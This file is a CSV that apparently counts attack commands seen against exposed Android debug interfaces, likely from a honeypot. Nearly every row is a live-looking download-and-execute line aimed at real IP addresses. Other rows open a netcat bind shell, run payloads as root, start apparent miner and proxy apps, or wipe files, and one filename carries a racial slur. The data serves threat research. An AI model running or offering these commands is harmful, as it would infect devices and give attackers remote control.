input,count
,355
(cd /data/local/tmp || cd /sdcard/downloads) && (wget -qO droid.sh http://213.209.150.186/droid.sh || curl -o droid.sh -sL http://213.209.150.186/droid.sh) && chmod 777 droid.sh && chmod +x droid.sh && ./droid.sh,2
(cd /data/local/tmp || cd /sdcard/downloads) && (wget -qO- http://213.209.150.186/droid.sh || curl -sL http://213.209.150.186/droid.sh) > droid.sh && chmod 777 droid.sh && chmod +x droid.sh && /system/bin/sh ./droid.sh &,6
(cd /data/local/tmp || cd /sdcard/downloads) && (wget -qO- http://213.209.150.186/droid.sh || curl -sL http://213.209.150.186/droid.sh) | sh,2
(ping -c 1 46.8.78.9)& ,2
/data/local/tmp/arm3 criminalip2,1
/data/local/tmp/arm3 shodan1,2
/data/local/tmp/arm3/main criminalip2,1
/data/local/tmp/arm6 20241231-GLOBAL2,1
/data/local/tmp/arm6 20250101-CIDR,1
/data/local/tmp/arm6 20250102-MAIN,1
/data/local/tmp/arm6/arm32 20241231-GLOBAL2,1
/data/local/tmp/arm6/arm32 20250101-CIDR,1
/data/local/tmp/arm6/arm32 20250102-MAIN,1
/data/local/tmp/nohup /data/local/tmp/log,102
/data/local/tmp/nohup /data/local/tmp/trinity,625
/data/local/tmp/nohup su -c /data/local/tmp/log,102
/data/local/tmp/nohup su -c /data/local/tmp/trinity,625
>/data/local/tmp/Downloads && cd /data/local/tmp/Downloads; >/sdcard/0/Downloads && cd /sdcard/0/Downloads; >/storage/emulated/0/Downloads && cd /storage/emulated/0/Downloads; wget http://103.149.87.69/d/hello -O-|sh,2
am start -n com.androld.servlces/.MainActivity,51
am start -n com.google.home.tv/com.example.test.MainActivity,113
am start -n com.socks.agent/.MainActivity,1246
am start -n com.ufo.miner/com.example.test.MainActivity,743
am start-foreground-service -n com.pluto.nouiapp/com.pluto.nouiapp.ForegroundService,2
am start-foreground-service -n com.wildlands.priv.lob/com.wildlands.priv.lob.ForegroundService,1
busybox nc -l -p 5555 -e /bin/sh,6
cd /data/local/tmp/ || cd /sdcard;wget http://77.37.96.100/z/arm7; chmod 755 arm7 ; ./arm7 adb,1
cd /data/local/tmp/; busybox wget http://1.3.3.7/w.sh; sh w.sh; curl http://1.3.3.7/c.sh; sh c.sh,2
cd /data/local/tmp/; busybox wget http://103.142.27.125/w.sh; sh w.sh; curl http://103.142.27.125/c.sh; sh c.sh,23
cd /data/local/tmp/; busybox wget http://103.175.16.117/adb.sh -O- | sh,144
cd /data/local/tmp/; busybox wget http://107.172.51.228/w.sh; sh w.sh; curl http://107.172.51.228/c.sh; sh c.sh,8
cd /data/local/tmp/; busybox wget http://107.173.35.192/w.sh; sh w.sh; curl http://107.173.35.192/c.sh; sh c.sh,2
cd /data/local/tmp/; busybox wget http://107.189.31.150/justbash.sh; sh justbash.sh; rm -rf justbash.sh,1
cd /data/local/tmp/; busybox wget http://134.209.74.81/w.sh; sh w.sh; curl http://134.209.74.81/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,7
cd /data/local/tmp/; busybox wget http://141.98.10.115/w.sh; sh w.sh; curl http://1.3.3.7/c.sh; sh c.sh,2
cd /data/local/tmp/; busybox wget http://141.98.10.115/w.sh; sh w.sh; curl http://141.98.10.115/c.sh; sh c.sh,8
cd /data/local/tmp/; busybox wget http://143.198.168.25/w.sh; sh w.sh; curl http://143.198.168.25/c.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,2
cd /data/local/tmp/; busybox wget http://147.185.221.24:9456/nigger1.sh; sh w.sh; curl http://147.185.221.24:9456/nigger2.sh; sh cc.sh; rm -rf w.sh; rm -rf c.sh; rm -rf *,1
cd /data/local/tmp/; busybox wget http://147.185.221.25:22983/wtds.sh; sh wtds.sh,6
cd /data/local/tmp/; busybox wget http://147.185.221.25:27143/dwadjs.sh; sh dwadjs.sh; rm -rf dwadjs.sh; rm -rf *,3
cd /data/local/tmp/; busybox wget http://154.213.187.80/w.sh; sh w.sh; curl http://154.213.187.80/c.sh; sh c.sh,9
cd /data/local/tmp/; busybox wget http://154.213.190.241/w.sh; sh w.sh; curl http://154.213.190.241/c.sh; sh c.sh,42
cd /data/local/tmp/; busybox wget http://154.216.19.12/w.sh; sh w.sh; curl http://154.216.19.12/c.sh; sh c.sh,4
cd /data/local/tmp/; busybox wget http://160.187.146.122/w.sh; sh w.sh; curl http://160.187.146.122/c.sh; sh c.sh,76
cd /data/local/tmp/; busybox wget http://160.191.86.209/ohshit.sh| curl http://160.191.86.209/ohshit.sh | wget http://160.191.86.209/ohshit.sh; chmod 777 *; ./ohshit.sh,1
cd /data/local/tmp/; busybox wget http://160.22.160.117/w.sh; sh w.sh; curl http://160.22.160.117/c.sh; sh c.sh,12
cd /data/local/tmp/; busybox wget http://160.22.160.31/w.sh; sh w.sh; curl http://160.22.160.31/c.sh; sh c.sh,10
cd /data/local/tmp/; busybox wget http://160.22.161.157/w.sh; sh w.sh; curl http://160.22.161.157/c.sh; sh c.sh,4
cd /data/local/tmp/; busybox wget http://160.22.161.89/w.sh; sh w.sh; curl http://160.22.161.89/c.sh; sh c.sh,16
